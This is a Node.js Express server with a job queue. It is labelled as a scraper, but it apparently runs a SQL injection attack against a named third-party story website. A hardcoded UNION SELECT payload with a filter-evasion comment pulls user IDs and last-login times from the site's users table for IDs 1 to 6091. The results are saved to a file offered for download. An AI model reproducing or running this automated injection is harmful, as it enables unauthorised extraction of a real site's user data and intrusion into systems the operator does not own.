const express = require('express');
const axios = require('axios');
const cheerio = require('cheerio');
const fs = require('fs');
const path = require('path');
const Queue = require('bull');
const Redis = require('ioredis');

const app = express();
const port = process.env.PORT || 3000;

// Setup Redis connection
const redisClient = new Redis();
const scrapeQueue = new Queue('scrapeQueue', {
  redis: {
    host: '127.0.0.1',
    port: 6379
  }
});

const urlTemplate1 = "https://golperjhuri.com/writer.php?wr=4+AND+0+/*!12345UNION*/+SELECT+(SELECT+GROUP_CONCAT(user_id,0x203a3a20,user_last_login+SEPARATOR+0x3c62723e)+FROM+users+WHERE+user_id=%d)--+-/*";
const urlTemplate2 = "https://golperjhuri.com/gj.php?uid=%d";

const outputFilePath = path.join(__dirname, 'h3_tags_output.txt');
const logFilePath = path.join(__dirname, 'scrape_log.txt');

// Middleware to serve static files
app.use(express.static(path.join(__dirname, 'public')));

// Route to start scraping
app.get('/start-scraping', async (req, res) => {
  try {
    await scrapeQueue.add({});
    res.send('Scraping job has been added to the queue!');
  } catch (error) {
    res.status(500).send('An error occurred while adding the scraping job to the queue.');
  }
});

// Route to check server status
app.get('/ping', (req, res) => {
  res.send('Server is running.');
});

// Route to download the output file
app.get('/download-output', (req, res) => {
  res.download(outputFilePath, 'h3_tags_output.txt', (err) => {
    if (err) {
      res.status(500).send('Error occurred while downloading the file.');
    }
  });
});

// Serve the web console
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Worker to process the scraping job
scrapeQueue.process(async (job, done) => {
  const scrapeData = async () => {
    const output = fs.createWriteStream(outputFilePath, { flags: 'a', encoding: 'utf-8' });
    const log = fs.createWriteStream(logFilePath, { flags: 'a', encoding: 'utf-8' });

    for (let userId = 1; userId <= 6091; userId++) {
      const url1 = urlTemplate1.replace('%d', userId);
      const url2 = urlTemplate2.replace('%d', userId);

      try {
        const [response1, response2] = await Promise.all([axios.get(url1), axios.get(url2)]);

        if (response1.status === 200 && response2.status === 200) {
          const $ = cheerio.load(response1.data);
          const h3Tags = $('h3');
          let thirdH3 = '';

          if (h3Tags.length > 2) {
            thirdH3 = $(h3Tags[2]).text().trim().replace('এর গল্প সমূহঃ -', '').trim();
          } else {
            log.write(`User ID ${userId}: Less than 3 H3 tags found.\n`);
          }

          const pageContent = response2.data.trim();
          output.write(`${thirdH3}\n${pageContent}\n`);
          log.write(`User ID ${userId}: Successfully processed.\n`);
        } else {
          log.write(`User ID ${userId}: Failed to retrieve pages. Status codes: ${response1.status}, ${response2.status}\n`);
        }
      } catch (error) {
        log.write(`User ID ${userId}: Error occurred: ${error.message}\n`);
      }
    }

    output.end();
    log.end();
  };

  try {
    await scrapeData();
    done();
  } catch (error) {
    done(new Error('Scraping job failed.'));
  }
});

app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
